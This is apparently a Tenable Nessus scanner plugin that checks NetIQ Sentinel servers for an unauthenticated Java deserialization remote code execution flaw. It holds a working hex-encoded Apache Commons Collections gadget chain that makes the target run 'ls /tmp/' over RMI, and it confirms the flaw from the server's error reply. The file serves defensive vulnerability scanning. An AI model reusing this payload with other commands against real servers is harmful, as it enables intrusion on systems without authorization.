#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(90602);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2017/01/17 14:52:18 $");

  script_osvdb_id(129952, 130424, 135498);
  script_xref(name:"CERT", value:"576313");

  script_name(english:"NetIQ Sentinel Java Object Deserialization RCE");
  script_summary(english:"Sends an unexpected Java object to the server.");

  script_set_attribute(attribute:"synopsis", value:
"The remote NetIQ Sentinel server is affected by a remote code 
execution vulnerability");
  script_set_attribute(attribute:"description", value:
"The remote Novell NetIQ Sentinel server is affected by a remote code
execution vulnerability due to unsafe deserialize calls of
unauthenticated Java objects to the Apache Commons Collections (ACC)
library. An unauthenticated, remote attacker can exploit this, by
sending a specially crafted serialized Java object via the RMI
interface, to execute arbitrary code with the privileges of the
application.");
  # https://download.novell.com/Download?buildid=ZEMvbiAk5k8~&donotredirect=true
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3cd78ca8");
  # http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0204f30");
  script_set_attribute(attribute:"solution", value:
"Upgrade to NetIQ Sentinel version 7.4.1 or later. Alternatively, 
contact the vendor for a workaround.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/03/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/04/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:netiq:sentinel");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2016-2017 Tenable Network Security, Inc.");

  script_dependencies("netiq_sentinel_detect.nbin", "rmiregistry_detect.nasl");
  script_require_ports("Services/rmi_registry");
  script_require_keys("installed_sw/NetIQ Sentinel");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("install_func.inc");
include("byte_func.inc");
include("audit.inc");
include("rmi.inc");

appname = "NetIQ Sentinel";
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_service(svc:"rmi_registry", ipproto:"tcp", exit_on_fail:1);
soc = rmi_connect(port:port);

# Due to the nature of this exploit, we can't see the result
# of the commands we execute. However, successful execution of
# our command will always result in a specific class cast exception
# being sent back to us. This object executes the command
# ls /tmp/ and we look for the failed cast to verify it executed.
request = '\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x00\x00\x00\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x15\x4d\xc9\xd4\xe6\x3b\xdf\x74\x00\x14\x70\x77\x6e\x65\x64\x32\x35\x35\x33\x39\x35\x32\x36\x35\x30\x37\x38\x32\x35\x37\x73\x7d\x00\x00\x00\x01\x00\x0f\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x52\x65\x6d\x6f\x74\x65\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x70\x78\x70\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x70\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x71\x00\x7e\x00\x00\x73\x71\x00\x7e\x00\x05\x73\x7d\x00\x00\x00\x01\x00\x0d\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x4d\x61\x70\x70\x78\x71\x00\x7e\x00\x02\x73\x71\x00\x7e\x00\x05\x73\x72\x00\x2a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x4c\x61\x7a\x79\x4d\x61\x70\x6e\xe5\x94\x82\x9e\x79\x10\x94\x03\x00\x01\x4c\x00\x07\x66\x61\x63\x74\x6f\x72\x79\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x70\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x70\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x05\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x70\x78\x70\x76\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x52\x75\x6e\x74\x69\x6d\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x70\x78\x70\x00\x00\x00\x02\x74\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x00\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x70\x78\x70\x76\x71\x00\x7e\x00\x24\x73\x71\x00\x7e\x00\x1c\x75\x71\x00\x7e\x00\x21\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x21\x00\x00\x00\x00\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x76\x71\x00\x7e\x00\x21\x73\x71\x00\x7e\x00\x1c\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x74\x00\x08\x6c\x73\x20\x2f\x74\x6d\x70\x2f\x74\x00\x04\x65\x78\x65\x63\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x01\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x17\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x70\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x73\x71\x00\x7e\x00\x09\x3f\x40\x00\x00\x00\x00\x00\x10\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x76\x72\x00\x12\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x76\x65\x72\x72\x69\x64\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x71\x00\x7e\x00\x3f\x78\x71\x00\x7e\x00\x3f';
send(socket:soc, data:request);
res = recv(socket:soc, length:0x300, min:0x200);
close(soc);

if (isnull(res) || "Integer cannot be cast to java.util.Set" >!< res) audit(AUDIT_INST_VER_NOT_VULN, appname);

report =
  '\nNessus was able to exploit a Java deserialization vulnerability by' +
  '\nsending a crafted Java object.' +
  '\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
